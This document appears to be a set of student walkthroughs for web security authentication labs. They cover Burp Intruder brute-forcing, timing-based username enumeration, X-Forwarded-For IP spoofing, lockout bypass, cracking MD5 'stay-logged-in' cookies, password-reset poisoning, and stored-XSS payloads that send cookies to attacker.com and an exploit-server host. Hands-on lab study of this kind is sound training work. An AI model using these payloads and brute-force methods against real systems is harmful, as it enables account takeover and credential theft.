**Step1**

Try login with any character


**Step2:**

In burpsuite see the login request

**Step3:**

See it to intruder. And select username and password


Select cluster bomb attack

Payload1 setting  we dd all username

Payload2 setting  we dd all password


Start attack

**Step4:**

Now we apply filter.



Result:


Username:albuquerque

Password:amanda


**Step1:**

First we login with username and password

**Step2:**

Send the POST /login request of username and password to repeater

If we enter correct username and password it show time normal time

If I increase the length of password the time get increase

Another example

But with different password combination our IP is block.

So we use

HTTP request with the X-Forwarded-For header

Before adding a new ip it was not howing this 302 found it show 200 ok response

**Step3:**

Now we apply payload on IP address and username and set a large wrong password

Send the request to intruder and select attack type pitch fork


**Payload 1**

**Payload2**


We have

After adding response received and response completed from column we have above result and it is clear that username is ftp

**Step4:**

Now we find password using same method but change ip and use password wordlist instead of username

And set username to ftp

Here is the result

From the result it is clear that username is ftp and password is ginger

Username:ftp

Password:ginger

**Step1:**

Login with given credential



**Step2:**

Now I we analyze POST /login request in burpsuite we can see I we try three time wrong uername and password combination it say


But we try two time wrong combination and correct combination third time it will allow

**Step3:**

To exploit this vulnerability we make a username list in which there is  sequence
```
Carlos
Carlos
Wiener
Carlos
Carlos
Wiener
```
And password list that contain
```
Password1
Password2
Wiener_pasword
Password3
Password4
Wiener_password
```
Script to make username wordlist

**Step4:**

Send request to repeater.

Select username and password and select attack type to pitch fork

Payload1


Payload2

In resource pool make a custmom resource pool with conurrent request to 1

Start attack

I


Form the result it s clear that the only one carlos has 302 so this is correct password

Code for username and password
```
//#include<iostream>

//using namespace std;

//int main(){

//        for (int i=1;i<=200;i++){

//                if (i%2==0){

//                        cout<<"wiener\n";

//                }

//                else{

//                        cout<<"carlos\n";

//                }

//        }

//}
```
```
#include <iostream>

#include <string>

using namespace std;

int main() {

    std::string passwords[] = {

        "123456", "password", "12345678", "qwerty", "123456789", "12345",

        "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123",

        "football", "monkey", "letmein", "shadow", "master", "666666",

        "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321",

        "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx",

        "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm",

        "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew",

        "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert",

        "thomas", "hockey", "ranger", "daniel", "starwars", "klaster",

        "112233", "george", "computer", "michelle", "jessica", "pepper",

        "1111", "zxcvbn", "555555", "11111111", "131313", "freedom",

        "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess",

        "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole",

        "chelsea", "biteme", "matthew", "access", "yankees", "987654321",

        "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail",

        "mom", "monitor", "monitoring", "montana", "moon", "moscow"

    };

    int size = sizeof(passwords) / sizeof(passwords[0]);

    // Print the modified array

    for(int i = 0; i < size * 2; i++) {

        if (i % 2 == 0) {

            cout << passwords[i / 2] << endl;

        } else {

            cout << "peter" << endl;

        }

    }

    return 0;

}
```

**Step1:**

First we try with random username and password



**Step2:**

Send the post login request to intruder.

As we know if we user valid username multiple time with wrong password it show message too many wrong attempt.

So first we find valid username



This is because we want to find a valid username…and in second we user null payload 5 time because after five 4 wrong attempt it say too many log in attempt

Attack type cluster bomb

Payload1



Payload2



Here is the result



From here it is clear that username is affiliate

**Step3:**

Now we find password

In intruder we set username to affiliate and apply password liston password

Attack type will  be snipper



We has the response



For other we have incorrect and too many wrong attempt messages





**Step1:**

Login with given credential and click on stay logged in


**Step2:**

Now we see request in burpsuite


If we decode stay-logged-in using base64

wiener:51dc30ddc473d43a6011e9ebba6ca770

And when we apply hash md5 crack on value it give

51dc30ddc473d43a6011e9ebba6ca770=peter

Based on python we use this script for generating hash value

import hashlib

import base64

List of passwords
```
password_list = [

    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111",

    "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein",

    "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael",

    "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe",

    "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster",

    "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",

    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster",

    "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn",

    "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753",

    "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love",

    "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321",

    "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor",

    "monitoring", "montana", "moon", "moscow"

]
```

Function to generate MD5 hash
```
def generate_md5_hash(password):

    md5_hash = hashlib.md5(password.encode()).hexdigest()

    return md5_hash

# Function to concatenate username and hashed password, then Base64 encode

def generate_base64_encoded_string(username, md5_hash):

    raw_string = f"{username}:{md5_hash}"

    base64_encoded = base64.b64encode(raw_string.encode()).decode()

    return base64_encoded

# Username to concatenate with

username = "carlos"

# Generate and print Base64 encoded strings for all passwords

for password in password_list:

    md5_hash = generate_md5_hash(password)

    base64_encoded_string = generate_base64_encoded_string(username, md5_hash)

    print(f"{base64_encoded_string}")
```

**Step3:**

Send the request to intruder

Remove ?id=wiener from GET /my-account?id=wiener

And add stay log in value for payload



Payload1:



In result it is clear that ….





**Step1:**

Login with given credential


**Step2:**

In /my-Account request we can see stay-log in value



If we decode stay-logged-in using base64

wiener:51dc30ddc473d43a6011e9ebba6ca770

And when we apply hash md5 crack on value it give

51dc30ddc473d43a6011e9ebba6ca770=peter

**Step3:**

As we know there I a cross-site in comment so first try to check if our own cookie are visible or not
```
<script>

document.location='http://attacker.com/steal?cookie=' + document.cookie;

</script>
```


Now if I click on view post we can see stay-logged in value in url



**Step4:**

Now we add expoilt server id and store in comment

```
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

In my case
```
1. <script>document.location='https://exploit-0a6e005404a0eee785b1b2c3017500d7.exploit-server.net/'+document.cookie</script>
```

If we access log we can see



Now we decode it url

stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz

Decode it base64

carlos:26323c16d5f4dabff3bb136f2460a943



And we have useername carlos and password onceuponatime

**Step5:**

Log in and delete user carlos



**Step1:**

Click on forgot password


Type here username



**Step2:**

Go to burpsuite and send /forgot-password to repeater



Add X_Forwarded-Host and change username to carlo



**Step3:**

Now we access the log and copy the Token and open a password reset link from email client and replace token with the token in log



And we can see this below page for carlos user





And lab get solve



**Step1:**

Login with given credential

**Step2:**

Now we change email .but first we enter different new password and confirm new password to check whatis the response



So it print

New passwords do not match

Now we change the password

**Step3:**

In burp we have request



Send it to intruder

Change username to carlos

Select password and bruteforce it with password list

New-password-1 and new-password-2 is different



Insetting we add grep to New passwords do not match


In result we have a carlos original password


